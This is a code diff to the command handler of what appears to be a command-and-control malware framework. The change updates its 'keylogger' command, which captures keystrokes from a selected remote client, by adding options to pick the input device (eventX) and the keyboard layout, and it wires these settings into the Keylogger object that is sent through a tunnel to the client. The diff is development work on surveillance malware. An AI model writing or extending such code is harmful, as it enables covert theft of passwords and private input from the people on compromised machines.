@@ -80,9 +80,10 @@ CommandHandler::CommandHandler(
     argument_list_.push_back(Argument(KILL_ARG, ARG_TYPE_SET, "-k", "--kill"));
     argument_list_.push_back(Argument(VERBOSITY_ARG, ARG_TYPE_INT, "-v", "--verbosity"));
     argument_list_.push_back(Argument(REMOVE_ARG, ARG_TYPE_SET, "-rm", "--remove"));
-    argument_list_.push_back(Argument(DEV_ARG, ARG_TYPE_INT, "-d", "--dev"));
     argument_list_.push_back(Argument(OUT_ARG, ARG_TYPE_STRING, "-o", "--out"));
     argument_list_.push_back(Argument(FILE_NAME_ARG, ARG_TYPE_STRING, "-f", "--file-name"));
+    argument_list_.push_back(Argument(DEVICE_ARG, ARG_TYPE_INT, "-d", "--dev"));
+    argument_list_.push_back(Argument(KB_LAYOUT_ARG, ARG_TYPE_STRING, "-l", "--layout"));
 
     command_map_.emplace("help", Command(
         "Show this help message. For specific command help <command> or <command> -h/--help", 
@@ -117,10 +118,10 @@ CommandHandler::CommandHandler(
         {HELP_ARG}
     ));
     command_map_.emplace("keylogger", Command(
-        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index>\nUse -rm to remove the keylogger from the client",
+        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index> -d <device number for eventX>\nBy default \"us\" layout is used. To change it specify it with -l/--layout argument. eg -l us \nUse -rm to remove the keylogger from the client",
         &CommandHandler::keylogger,
         this,
-        {HELP_ARG, REMOVE_ARG},
+        {HELP_ARG, REMOVE_ARG, DEVICE_ARG, KB_LAYOUT_ARG},
         {INDEX_ARG}
     ));
     command_map_.emplace("kill", Command(
@@ -418,7 +419,19 @@ void CommandHandler::keylogger() {
         }
     } else {
         if (p_tunnel == nullptr) {
+            if (arg_map_.find(DEVICE_ARG) == arg_map_.end()) {
+                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Specify the target device name using -d/--dev.  You can get a list of devices using the get-dev -o <output file> command" << RESET_C2_FIFO;
+                return;
+            }
+
+            std::string layout = "us";
+            if (arg_map_.find(KB_LAYOUT_ARG) != arg_map_.end()) {
+                layout = std::any_cast<std::string>(arg_map_[KB_LAYOUT_ARG]);
+            }
+
             Keylogger* keylogger = new Keylogger();
+            keylogger->set_dev(std::any_cast<int>(arg_map_[DEVICE_ARG]));
+            keylogger->set_layout(layout);
             Tunnel* tunnel = new Tunnel(client_index, KEYLOGGER, keylogger);
             {
                 std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
